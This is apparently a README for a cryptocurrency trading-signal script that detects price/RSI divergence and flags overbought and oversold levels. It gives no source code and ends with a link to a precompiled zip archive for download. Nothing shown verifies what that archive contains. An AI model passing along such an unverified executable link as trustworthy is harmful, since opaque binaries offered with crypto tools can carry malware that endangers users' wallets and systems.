# advansed-crypto-signal-bot
![изображение](https://github.com/user-attachments/assets/fe8b1609-523a-4e52-b0ad-75d814cb799d)
This code detects divergence between price and RSI. The last three values of price and RSI are considered. If price and the indicator change in different directions, this may signal divergence:

Bullish Divergence: Price is falling, while RSI is rising.

Bearish Divergence: Price is rising, while RSI is falling. The strength of the divergence is also determined based on the difference between the RSI values over the last two periods: weak (less than 5), moderate (5 to 10)
and strong (greater than 10).

Thus, this script helps automate cryptocurrency market monitoring, track potential trading signals based on price and RSI changes, and identify possible divergences.

Define the list of coins you want to track in the COINS variable.

Set the desired time frame, RSI period, and overbought/oversold levels.

Run the script, and it will print trading signals based on divergence and RSI levels for the selected coins.

Notes:
RSI (Relative Strength Index): The script checks whether the RSI value is in the overbought (> 70) or oversold (< 30) zone and prints that information.

Divergence: It looks for a discrepancy between price movement and RSI to identify possible bullish or bearish trends.

ATR: The script uses a simple method based on standard deviation to approximate the Average True Range (ATR) and determine volatility.

Compiled version with 4h timeframe(default): https://github.com/lucaswrao/crypto-signal-bot/releases/download/crypto/signals.zip


